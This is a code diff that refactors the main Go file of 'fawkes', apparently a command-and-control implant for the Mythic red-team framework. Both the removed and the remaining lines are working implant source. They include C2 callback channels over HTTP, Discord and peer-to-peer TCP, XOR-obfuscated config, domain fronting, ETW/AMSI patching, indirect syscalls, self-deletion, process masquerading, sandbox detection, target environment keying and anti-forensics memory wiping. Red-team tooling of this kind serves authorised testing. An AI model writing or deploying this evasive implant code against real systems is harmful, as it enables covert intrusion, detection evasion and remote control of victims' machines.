@@ -2,84 +2,21 @@ package main
 
 import (
 	"context"
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io"
 	"log"
 	"math/rand"
-	"net"
 	"os"
 	"os/signal"
-	"regexp"
-	"runtime"
-	"strconv"
-	"strings"
 	"sync"
 	"syscall"
 	"time"
 
-	"github.com/google/uuid"
-
 	"fawkes/pkg/commands"
-	"fawkes/pkg/discord"
 	"fawkes/pkg/files"
-	"fawkes/pkg/http"
-	"fawkes/pkg/httpx"
 	"fawkes/pkg/profiles"
-	"fawkes/pkg/rpfwd"
 	"fawkes/pkg/socks"
 	"fawkes/pkg/structs"
-	"fawkes/pkg/tcp"
-)
-
-var (
-	// These variables are populated at build time by the Go linker
-	payloadUUID       string = ""
-	callbackHost      string = ""
-	callbackPort      string = "443"
-	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
-	sleepInterval     string = "10"
-	jitter            string = "10"
-	encryptionKey     string = ""
-	killDate          string = "0"
-	maxRetries        string = "10"
-	debug             string = "false"
-	getURI            string = "/data"
-	postURI           string = "/data"
-	hostHeader        string = ""     // Override Host header for domain fronting
-	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
-	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
-	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
-	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
-	contentTypes      string = ""     // Comma-separated Content-Type values for request rotation
-	// bodyTransforms removed: use httpx C2 profile for malleable transforms
-	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
-	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
-	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
-	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
-	envKeyHostname    string = ""     // Environment key: hostname must match this regex
-	envKeyDomain      string = ""     // Environment key: domain must match this regex
-	envKeyUsername    string = ""     // Environment key: username must match this regex
-	envKeyProcess     string = ""     // Environment key: this process must be running
-	selfDelete        string = ""     // Self-delete binary from disk after execution starts
-	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
-	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
-	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
-	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
-	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
-	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
-	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
-	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
-	sleepGuardPages   string = ""     // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
-	discordBotToken          string = ""     // Discord bot token for Discord C2 profile
-	discordChannelID         string = ""     // Discord channel ID for Discord C2 profile
-	discordPollDelay         string = ""     // Seconds between Discord message polls (default: 10)
-	discordPollChecks        string = ""     // Max polling attempts per exchange (default: 10)
-	httpxConfig              string = ""     // Base64-encoded httpx agent config JSON (transforms, URIs, headers)
-	httpxDomains             string = ""     // Comma-separated httpx callback domains
-	httpxRotation            string = ""     // httpx domain rotation: fail-over, round-robin, random
-	httpxFailoverThreshold   string = ""     // httpx failover threshold (consecutive failures before switching)
 )
 
 func main() {
@@ -93,410 +30,32 @@ func main() {
 }
 
 func runAgent() {
-	// Deobfuscate C2 config strings if XOR key is present
-	if xorKey != "" {
-		keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
-		if err == nil && len(keyBytes) > 0 {
-			payloadUUID = xorDecodeString(payloadUUID, keyBytes)
-			callbackHost = xorDecodeString(callbackHost, keyBytes)
-			callbackPort = xorDecodeString(callbackPort, keyBytes)
-			userAgent = xorDecodeString(userAgent, keyBytes)
-			encryptionKey = xorDecodeString(encryptionKey, keyBytes)
-			getURI = xorDecodeString(getURI, keyBytes)
-			postURI = xorDecodeString(postURI, keyBytes)
-			hostHeader = xorDecodeString(hostHeader, keyBytes)
-			proxyURL = xorDecodeString(proxyURL, keyBytes)
-			customHeaders = xorDecodeString(customHeaders, keyBytes)
-			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
-			contentTypes = xorDecodeString(contentTypes, keyBytes)
-			discordBotToken = xorDecodeString(discordBotToken, keyBytes)
-			discordChannelID = xorDecodeString(discordChannelID, keyBytes)
-			httpxConfig = xorDecodeString(httpxConfig, keyBytes)
-			httpxDomains = xorDecodeString(httpxDomains, keyBytes)
-			// Zero the XOR key — no longer needed after deobfuscation
-			zeroBytes(keyBytes)
-		}
-	}
+	// Phase 1: Deobfuscate config strings
+	deobfuscateConfig()
 
-	// Convert string build variables to appropriate types with validation
-	callbackPortInt, err := strconv.Atoi(callbackPort)
-	if err != nil {
-		log.Printf("cfg: port=%q fallback=443", callbackPort)
-		callbackPortInt = 443
-	}
-	sleepIntervalInt, err := strconv.Atoi(sleepInterval)
-	if err != nil || sleepIntervalInt < 0 {
-		log.Printf("cfg: interval=%q fallback=10", sleepInterval)
-		sleepIntervalInt = 10
-	}
-	jitterInt, err := strconv.Atoi(jitter)
-	if err != nil || jitterInt < 0 || jitterInt > 100 {
-		log.Printf("cfg: jitter=%q fallback=10", jitter)
-		jitterInt = 10
-	}
-	killDateInt64, err := strconv.ParseInt(killDate, 10, 64)
-	if err != nil {
-		log.Printf("cfg: expiry=%q fallback=0", killDate)
-		killDateInt64 = 0
-	}
-	maxRetriesInt, err := strconv.Atoi(maxRetries)
-	if err != nil || maxRetriesInt < 0 {
-		log.Printf("cfg: retries=%q fallback=10", maxRetries)
-		maxRetriesInt = 10
-	}
-	debugBool, err := strconv.ParseBool(debug)
-	if err != nil {
-		debugBool = false
-	}
+	// Phase 2: Parse and validate configuration
+	cfg := parseConfigValues()
+	setupLogging(cfg.debug)
 
-	// Setup logging — suppress all output in production to avoid leaking operational details to stderr
-	if debugBool {
-		log.SetOutput(os.Stdout)
-	} else {
-		log.SetOutput(io.Discard)
-	}
-
-	// Verify required configuration
-	if payloadUUID == "" {
-		payloadUUID = uuid.New().String()
-		log.Printf("cfg: generated id=%s", payloadUUID)
-	}
-
-	// Check kill date
-	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
-		log.Printf("expired, exiting")
+	if !validateConfig(cfg) {
 		os.Exit(0)
 	}
 
-	// Check environment keys — exit silently if any check fails (no network activity)
-	if !checkEnvironmentKeys() {
-		os.Exit(0)
+	// Phase 3: Apply startup security patches
+	applySecurity()
+
+	// Phase 4: Initialize agent struct
+	agent := initializeAgent(cfg)
+
+	// Phase 5: Initialize C2 profile
+	c2Init, err := initC2Profile(cfg)
+	if err != nil {
+		log.Printf("%v", err)
+		return
 	}
-
-	// Auto-patch ETW/AMSI: neutralize detection before any activity (Windows only)
-	if autoPatch == "true" {
-		autoStartupPatch()
-	}
-
-	// Initialize indirect syscalls: resolve Nt* syscall numbers from ntdll (Windows only)
-	if indirectSyscalls == "true" {
-		initIndirectSyscalls()
-	}
-
-	// Self-delete: remove binary from disk after startup (process continues from memory)
-	if selfDelete == "true" {
-		selfDeleteBinary()
-	}
-
-	// Process name masquerade: change /proc/self/comm on Linux
-	if masqueradeName != "" {
-		masqueradeProcess(masqueradeName)
-	}
-
-	// Parse working hours configuration
-	whStartMinutes := 0
-	whEndMinutes := 0
-	var whDays []int
-	if workingHoursStart != "" {
-		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
-			log.Printf("cfg: sched start=%q: %v", workingHoursStart, err)
-		} else {
-			whStartMinutes = parsed
-		}
-	}
-	if workingHoursEnd != "" {
-		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
-			log.Printf("cfg: sched end=%q: %v", workingHoursEnd, err)
-		} else {
-			whEndMinutes = parsed
-		}
-	}
-	if workingDays != "" {
-		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
-			log.Printf("cfg: sched days=%q: %v", workingDays, err)
-		} else {
-			whDays = parsed
-		}
-	}
-
-	// Initialize the agent
-	agent := &structs.Agent{
-		PayloadUUID:       payloadUUID,
-		Architecture:      runtime.GOARCH,
-		Domain:            "",
-		ExternalIP:        "",
-		Host:              getHostname(),
-		Integrity:         getIntegrityLevel(),
-		InternalIP:        getInternalIP(),
-		OS:                getOperatingSystem(),
-		PID:               os.Getpid(),
-		ProcessName:       os.Args[0],
-		SleepInterval:     sleepIntervalInt,
-		Jitter:            jitterInt,
-		User:              getUsername(),
-		Description:       payloadUUID[:8],
-		KillDate:          killDateInt64,
-		WorkingHoursStart: whStartMinutes,
-		WorkingHoursEnd:   whEndMinutes,
-		WorkingDays:       whDays,
-	}
-
-	// Initialize C2 profile based on configuration
-	var c2 profiles.Profile
-
-	if tcpBindAddress != "" {
-		// TCP P2P mode — this agent is a child that listens for a parent connection
-		log.Printf("bind %s", tcpBindAddress)
-		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
-		c2 = profiles.NewTCPProfile(tcpProfile)
-		// Make TCP profile available to link/unlink commands
-		commands.SetTCPProfile(tcpProfile)
-	} else if discordBotToken != "" {
-		// Discord C2 mode — communicate through a Discord channel
-		log.Printf("discord c2")
-
-		// Parse Discord-specific poll parameters
-		pollDelay := 10
-		if discordPollDelay != "" {
-			if v, err := strconv.Atoi(discordPollDelay); err == nil && v > 0 {
-				pollDelay = v
-			}
-		}
-		pollChecks := 10
-		if discordPollChecks != "" {
-			if v, err := strconv.Atoi(discordPollChecks); err == nil && v > 0 {
-				pollChecks = v
-			}
-		}
-
-		discordProfile := discord.NewDiscordProfile(
-			discordBotToken,
-			discordChannelID,
-			encryptionKey,
-			sleepIntervalInt,
-			jitterInt,
-			pollChecks,
-			pollDelay,
-			debugBool,
-			proxyURL,
-		)
-		c2 = profiles.NewDiscordProfile(discordProfile)
-
-		// Seal the Discord config vault — encrypts bot token, channel ID, and
-		// encryption key with AES-256-GCM to reduce memory forensics exposure.
-		if err := discordProfile.SealConfig(); err != nil {
-			log.Printf("seal failed: %v", err)
-		}
-
-		// TCP P2P child management (Discord egress agents can also link to TCP children)
-		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
-		commands.SetTCPProfile(tcpP2P)
-
-		// Wire up delegate hooks for P2P routing through Discord
-		discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
-			return tcpP2P.DrainDelegatesOnly()
-		}
-		discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
-			return tcpP2P.DrainDelegatesAndEdges()
-		}
-		discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
-			tcpP2P.RouteToChildren(delegates)
-		}
-
-		// Wire up rpfwd hooks for reverse port forwarding
-		rpfwdManager := rpfwd.NewManager()
-		defer rpfwdManager.Close()
-		commands.SetRpfwdManager(rpfwdManager)
-		discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
-		discordProfile.HandleRpfwd = rpfwdManager.HandleMessages
-
-		// Wire up interactive hooks for PTY/terminal bidirectional streaming
-		discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
-		discordProfile.HandleInteractive = commands.RouteInteractiveInput
-	} else if httpxConfig != "" {
-		// httpx C2 mode — malleable transforms, domain rotation, flexible message placement
-		log.Printf("httpx c2")
-
-		// Decode the base64-encoded agent config JSON
-		configBytes, err := base64.StdEncoding.DecodeString(httpxConfig)
-		if err != nil {
-			log.Printf("httpx config decode failed: %v", err)
-			return
-		}
-		agentCfg, err := httpx.ParseAgentConfig(configBytes)
-		if err != nil {
-			log.Printf("httpx config parse failed: %v", err)
-			return
-		}
-
-		// Parse callback domains
-		var domains []string
-		if httpxDomains != "" {
-			for _, d := range strings.Split(httpxDomains, ",") {
-				d = strings.TrimSpace(d)
-				if d != "" {
-					domains = append(domains, d)
-				}
-			}
-		}
-		if len(domains) == 0 {
-			log.Printf("httpx: no callback domains configured")
-			return
-		}
-
-		// Parse rotation and failover
-		rotation := "fail-over"
-		if httpxRotation != "" {
-			rotation = httpxRotation
-		}
-		failoverThreshold := 5
-		if httpxFailoverThreshold != "" {
-			if v, err := strconv.Atoi(httpxFailoverThreshold); err == nil && v > 0 {
-				failoverThreshold = v
-			}
-		}
-
-		httpxProfile := httpx.NewHTTPXProfile(
-			domains,
-			rotation,
-			failoverThreshold,
-			encryptionKey,
-			maxRetriesInt,
-			sleepIntervalInt,
-			jitterInt,
-			debugBool,
-			agentCfg,
-			proxyURL,
-		)
-		c2 = profiles.NewHTTPXProfile(httpxProfile)
-
-		// Seal the httpx config vault
-		if err := httpxProfile.SealConfig(); err != nil {
-			log.Printf("seal failed: %v", err)
-		}
-
-		// TCP P2P child management
-		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
-		commands.SetTCPProfile(tcpP2P)
-
-		// Wire up delegate hooks
-		httpxProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
-			return tcpP2P.DrainDelegatesOnly()
-		}
-		httpxProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
-			return tcpP2P.DrainDelegatesAndEdges()
-		}
-		httpxProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
-			tcpP2P.RouteToChildren(delegates)
-		}
-
-		// Wire up rpfwd hooks
-		rpfwdManager := rpfwd.NewManager()
-		defer rpfwdManager.Close()
-		commands.SetRpfwdManager(rpfwdManager)
-		httpxProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
-		httpxProfile.HandleRpfwd = rpfwdManager.HandleMessages
-
-		// Wire up interactive hooks
-		httpxProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
-		httpxProfile.HandleInteractive = commands.RouteInteractiveInput
-	} else {
-		// HTTP egress mode (default)
-		var callbackURL string
-		if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
-			callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
-		} else {
-			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
-		}
-
-		// Parse fallback C2 URLs (comma-separated, each gets same port appended if needed)
-		var fallbackURLs []string
-		if fallbackHosts != "" {
-			for _, fb := range strings.Split(fallbackHosts, ",") {
-				fb = strings.TrimSpace(fb)
-				if fb == "" {
-					continue
-				}
-				if strings.HasPrefix(fb, "http://") || strings.HasPrefix(fb, "https://") {
-					fallbackURLs = append(fallbackURLs, fmt.Sprintf("%s:%d", fb, callbackPortInt))
-				} else {
-					fallbackURLs = append(fallbackURLs, fmt.Sprintf("http://%s:%d", fb, callbackPortInt))
-				}
-			}
-		}
-
-		// Parse content types (comma-separated list for request rotation)
-		var ctList []string
-		if contentTypes != "" {
-			for _, ct := range strings.Split(contentTypes, ",") {
-				ct = strings.TrimSpace(ct)
-				if ct != "" {
-					ctList = append(ctList, ct)
-				}
-			}
-		}
-
-		httpProfile := http.NewHTTPProfile(
-			callbackURL,
-			userAgent,
-			encryptionKey,
-			maxRetriesInt,
-			sleepIntervalInt,
-			jitterInt,
-			debugBool,
-			getURI,
-			postURI,
-			hostHeader,
-			proxyURL,
-			tlsVerify,
-			tlsFingerprint,
-			fallbackURLs,
-			ctList,
-		)
-		// Decode and apply custom HTTP headers from C2 profile
-		if customHeaders != "" {
-			if decoded, err := base64.StdEncoding.DecodeString(customHeaders); err == nil {
-				var headers map[string]string
-				if err := json.Unmarshal(decoded, &headers); err == nil {
-					httpProfile.CustomHeaders = headers
-				}
-			}
-		}
-		c2 = profiles.NewProfile(httpProfile)
-
-		// Seal the C2 config vault — encrypts sensitive fields (BaseURL, EncryptionKey,
-		// UserAgent, endpoints) with AES-256-GCM. Fields are only decrypted on-demand
-		// for the duration of each HTTP operation, reducing memory forensics exposure.
-		if err := httpProfile.SealConfig(); err != nil {
-			log.Printf("seal failed: %v", err)
-		}
-
-		// Also create a TCP profile instance for P2P child management.
-		// Even HTTP egress agents can link to TCP children.
-		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
-		commands.SetTCPProfile(tcpP2P)
-
-		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
-		httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
-			return tcpP2P.DrainDelegatesOnly()
-		}
-		httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
-			return tcpP2P.DrainDelegatesAndEdges()
-		}
-		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
-			tcpP2P.RouteToChildren(delegates)
-		}
-
-		// Wire up rpfwd hooks for reverse port forwarding
-		rpfwdManager := rpfwd.NewManager()
-		defer rpfwdManager.Close()
-		commands.SetRpfwdManager(rpfwdManager)
-		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
-		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
-
-		// Wire up interactive hooks for PTY/terminal bidirectional streaming
-		httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
-		httpProfile.HandleInteractive = commands.RouteInteractiveInput
+	c2 := c2Init.profile
+	if c2Init.rpfwdMgr != nil {
+		defer c2Init.rpfwdMgr.Close()
 	}
 
 	// Configure child process protections (Windows: block non-Microsoft DLLs)
@@ -504,33 +63,30 @@ func runAgent() {
 		commands.SetBlockDLLs(true)
 	}
 
-	// Share configured User-Agent with commands (e.g., curl) to avoid hardcoded duplicates
+	// Share configured User-Agent with commands to avoid hardcoded duplicates
 	commands.DefaultUserAgent = userAgent
 
 	// Clear build-time globals — all values have been copied into agent/profile structs.
-	// Prevents memory forensics from extracting sensitive config from the data segment.
 	sandboxGuardEnabled := sandboxGuard == "true"
 	sleepMaskEnabled := sleepMask == "true"
 	guardPagesEnabled := sleepGuardPages == "true"
 	clearGlobals()
 
-	// Initialize command handlers
+	// Initialize command handlers and file transfer goroutines
 	commands.Initialize()
-
-	// Initialize file transfer goroutines
 	files.Initialize()
 
-	// Initial checkin with exponential backoff retry
+	// Phase 6: Initial checkin with exponential backoff retry
 	log.Printf("connecting")
-	for attempt := 0; attempt < maxRetriesInt; attempt++ {
+	for attempt := 0; attempt < cfg.maxRetries; attempt++ {
 		if err := c2.Checkin(agent); err != nil {
 			log.Printf("connect attempt %d: %v", attempt+1, err)
 			backoffMultiplier := 1 << min(attempt, 8)
-			backoffSeconds := sleepIntervalInt * backoffMultiplier
+			backoffSeconds := cfg.sleepInterval * backoffMultiplier
 			if backoffSeconds > 300 {
 				backoffSeconds = 300
 			}
-			sleepTime := calculateSleepTime(backoffSeconds, jitterInt)
+			sleepTime := calculateSleepTime(backoffSeconds, cfg.jitter)
 			time.Sleep(sleepTime)
 			continue
 		}
@@ -541,17 +97,15 @@ func runAgent() {
 	return
 checkinDone:
 
-	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
-	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
-	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.CallbackUUID == "" {
-		tcpP2P.CallbackUUID = c2.GetCallbackUUID()
+	// Propagate callback UUID to TCP P2P instance for Mythic's P2P graph
+	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.GetCallbackUUID() == "" {
+		tcpP2P.UpdateCallbackUUID(c2.GetCallbackUUID())
 	}
 
 	// Create context for graceful shutdown
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Handle signals for graceful shutdown
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	defer signal.Stop(sigChan)
@@ -566,9 +120,9 @@ checkinDone:
 	socksManager := socks.NewManager()
 	defer socksManager.Close()
 
-	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
+	// Start main execution loop
 	log.Printf("running %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
+	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("stopped")
 }
@@ -835,132 +389,15 @@ func calculateSleepTime(interval, jitter int) time.Duration {
 
 	// Randomly add or subtract jitter (50/50 chance)
 	if rand.Intn(2) == 0 {
-		// Add jitter
 		actualInterval := interval + int(jitterDiff)
 		return time.Duration(actualInterval) * time.Second
 	} else {
-		// Subtract jitter
 		actualInterval := interval - int(jitterDiff)
 		if actualInterval < 1 {
 			actualInterval = 1 // Minimum 1 second
 		}
 		return time.Duration(actualInterval) * time.Second
 	}
-}
-
-// Helper functions for system information
-func getHostname() string {
-	if hostname, err := os.Hostname(); err == nil {
-		return hostname
-	}
-	return "unknown"
-}
-
-func getUsername() string {
-	if user := os.Getenv("USER"); user != "" {
-		return user
-	}
-	if user := os.Getenv("USERNAME"); user != "" {
-		return user
-	}
-	return "unknown"
-}
-
-func getOperatingSystem() string {
-	return runtime.GOOS
-}
-
-func getInternalIP() string {
-	ifaces, err := net.Interfaces()
-	if err != nil {
-		return "127.0.0.1"
-	}
-	for _, iface := range ifaces {
-		// Skip loopback and down interfaces
-		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
-			continue
-		}
-		addrs, err := iface.Addrs()
-		if err != nil {
-			continue
-		}
-		for _, addr := range addrs {
-			var ip net.IP
-			switch v := addr.(type) {
-			case *net.IPNet:
-				ip = v.IP
-			case *net.IPAddr:
-				ip = v.IP
-			}
-			if ip == nil || ip.IsLoopback() {
-				continue
-			}
-			// Prefer IPv4
-			if ip4 := ip.To4(); ip4 != nil {
-				return ip4.String()
-			}
-		}
-	}
-	return "127.0.0.1"
-}
-
-// checkEnvironmentKeys validates all configured environment keys.
-// Returns true if all checks pass (or no keys configured). Returns false if any check fails.
-// On failure, the agent should exit silently — no logging, no network activity.
-func checkEnvironmentKeys() bool {
-	if envKeyHostname != "" {
-		hostname, _ := os.Hostname()
-		if !regexMatch(envKeyHostname, hostname) {
-			return false
-		}
-	}
-	if envKeyDomain != "" {
-		domain := getEnvironmentDomain()
-		if !regexMatch(envKeyDomain, domain) {
-			return false
-		}
-	}
-	if envKeyUsername != "" {
-		username := getUsername()
-		if !regexMatch(envKeyUsername, username) {
-			return false
-		}
-	}
-	if envKeyProcess != "" {
-		if !isProcessRunning(envKeyProcess) {
-			return false
-		}
-	}
-	return true
-}
-
-// regexMatch performs a case-insensitive full-string regex match.
-func regexMatch(pattern, value string) bool {
-	// Anchor the pattern to match the full string
-	anchored := "(?i)^(?:" + pattern + ")$"
-	re, err := regexp.Compile(anchored)
-	if err != nil {
-		// Invalid regex — fail closed (don't execute)
-		return false
-	}
-	return re.MatchString(value)
-}
-
-// xorDecodeString decodes a base64-encoded XOR-encrypted string.
-// If the input is empty or decoding fails, returns the original string.
-func xorDecodeString(encoded string, key []byte) string {
-	if encoded == "" || len(key) == 0 {
-		return encoded
-	}
-	data, err := base64.StdEncoding.DecodeString(encoded)
-	if err != nil {
-		return encoded // not encoded, use as-is
-	}
-	result := make([]byte, len(data))
-	for i, b := range data {
-		result[i] = b ^ key[i%len(key)]
-	}
-	return string(result)
 }
 
 // guardedSleep performs a sleep with sandbox detection. If the sleep completes
@@ -973,73 +410,6 @@ func guardedSleep(d time.Duration) bool {
 	before := time.Now()
 	time.Sleep(d)
 	elapsed := time.Since(before)
-	// If less than 75% of the requested duration actually elapsed,
-	// the sandbox is accelerating time.
 	threshold := d * 3 / 4
 	return elapsed >= threshold
-}
-
-// zeroBytes overwrites a byte slice with zeros to clear sensitive data from memory.
-func zeroBytes(b []byte) {
-	for i := range b {
-		b[i] = 0
-	}
-}
-
-// clearGlobals zeros out ALL build-time global variables after they have been
-// copied into the agent/profile structs. This prevents sensitive config
-// data (encryption keys, C2 URLs, UUIDs, operational parameters) from
-// lingering in the binary's data segment where memory forensics tools
-// (Volatility, WinDbg) could extract them.
-func clearGlobals() {
-	// C2 connection config
-	payloadUUID = ""
-	callbackHost = ""
-	callbackPort = ""
-	userAgent = ""
-	encryptionKey = ""
-	getURI = ""
-	postURI = ""
-	hostHeader = ""
-	proxyURL = ""
-	customHeaders = ""
-	xorKey = ""
-	tlsVerify = ""
-	tlsFingerprint = ""
-	fallbackHosts = ""
-	contentTypes = ""
-	tcpBindAddress = ""
-	discordBotToken = ""
-	discordChannelID = ""
-	discordPollDelay = ""
-	discordPollChecks = ""
-	httpxConfig = ""
-	httpxDomains = ""
-	httpxRotation = ""
-	httpxFailoverThreshold = ""
-
-	// Operational parameters
-	sleepInterval = ""
-	jitter = ""
-	killDate = ""
-	maxRetries = ""
-	debug = ""
-	workingHoursStart = ""
-	workingHoursEnd = ""
-	workingDays = ""
-
-	// Environment keys (reveal targeting criteria)
-	envKeyHostname = ""
-	envKeyDomain = ""
-	envKeyUsername = ""
-	envKeyProcess = ""
-
-	// OPSEC feature flags (reveal agent capabilities)
-	selfDelete = ""
-	masqueradeName = ""
-	autoPatch = ""
-	blockDLLs = ""
-	indirectSyscalls = ""
-	sandboxGuard = ""
-	sleepMask = ""
 }
